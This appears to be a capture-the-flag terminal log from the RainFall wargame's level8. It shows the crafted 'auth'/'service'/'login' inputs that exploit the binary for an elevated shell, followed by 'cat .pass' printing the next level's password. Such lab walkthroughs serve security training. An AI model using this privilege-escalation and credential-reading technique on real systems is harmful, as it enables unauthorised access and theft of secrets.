level8@RainFall:~$ ./level8
(nil), (nil) 
auth A
0x804a008, (nil) 
service CCCCCCCCCCCCCCCCCCCCC
0x804a008, 0x804a018 
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ pwd
/home/user/level8
$ ls
ls: cannot open directory .: Permission denied
$ cd /home/user/level9
$ ls
level9
$ ls -a
.  ..  .bash_logout  .bashrc  level9  .pass  .profile
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$ 